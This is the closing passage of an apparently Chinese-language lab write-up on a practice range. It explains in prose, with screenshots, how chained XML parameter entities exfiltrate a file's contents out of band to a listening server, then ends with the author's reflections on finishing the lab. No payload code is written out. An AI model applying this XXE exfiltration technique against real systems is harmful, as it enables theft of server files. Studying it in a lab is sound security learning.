[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-80bed32fcfe7a5660844059e79b051ec650e2d0e.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-80bed32fcfe7a5660844059e79b051ec650e2d0e.png)  
说说个人理解，首先将文件读取的内容赋给`file`，然后`remote`是一个定义参数实体的字符串，其中`%`需要用实体编码`%#37;`替代避免影响语义，后面使用`%file;`引用`file`的内容拼接出完整的请求url，接着引用`%remote;`，这样就是定义了`send`，然后再引用`%send;`，就会向监听服务器发起请求。  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-dceaa53e0bd6124780aea17b8f58d6db69ea6313.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-dceaa53e0bd6124780aea17b8f58d6db69ea6313.png)  
发包后就可以从请求中看到外带的数据了。  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-2eda242c6d2032b964fbdf2ac75123031a2713fe.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-2eda242c6d2032b964fbdf2ac75123031a2713fe.png)

后记
==

本篇已经是终篇了，整个靶场的学习到此也就完结了。虽然是基础的靶场，但是收获还是挺多的。当我静下心去研究时，才发现原来有很多细节其实我从来都没弄懂过。所以如果能去掉浮躁的心，不再蜻蜓点水一般，而是认真深入的学习，也许会有很意外的收获。